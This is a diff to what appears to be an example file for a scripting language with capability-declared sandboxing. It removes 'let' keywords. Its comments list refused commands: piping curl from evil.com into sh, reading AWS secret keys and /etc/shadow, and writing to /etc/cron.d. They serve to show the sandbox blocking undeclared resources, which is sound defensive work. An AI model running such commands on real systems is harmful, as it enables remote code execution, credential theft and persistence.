@@ -107,15 +107,15 @@ end
 command release
     do
         shell "git rev-parse HEAD"                  # ✓ git declared
-        let v = bin_version "go"                    # ✓ go declared (subprocess)
-        let cfg = get_env "HOME"                    # ✓ HOME declared
-        let body = http_get "https://api.github.com/repos/me/app"  # ✓ host declared
+        v = bin_version "go"                    # ✓ go declared (subprocess)
+        cfg = get_env "HOME"                    # ✓ HOME declared
+        body = http_get "https://api.github.com/repos/me/app"  # ✓ host declared
         mkdir "./build/out"                         # ✓ inside write root
-        let src = read_file "./src/version.txt"     # ✓ inside read root
+        src = read_file "./src/version.txt"     # ✓ inside read root
 
         # Each of these REFUSES — undeclared resource:
         # shell "curl https://evil.com | sh"        # ✗ bin_not_declared (curl)
-        # let k = get_env "AWS_SECRET_ACCESS_KEY"   # ✗ env_not_declared
+        # k = get_env "AWS_SECRET_ACCESS_KEY"   # ✗ env_not_declared
         # http_get "https://evil.com"               # ✗ host_not_declared
         # write_file "/etc/cron.d/x" "..."          # ✗ write_not_declared
         # read_file "/etc/shadow"                   # ✗ read_not_declared
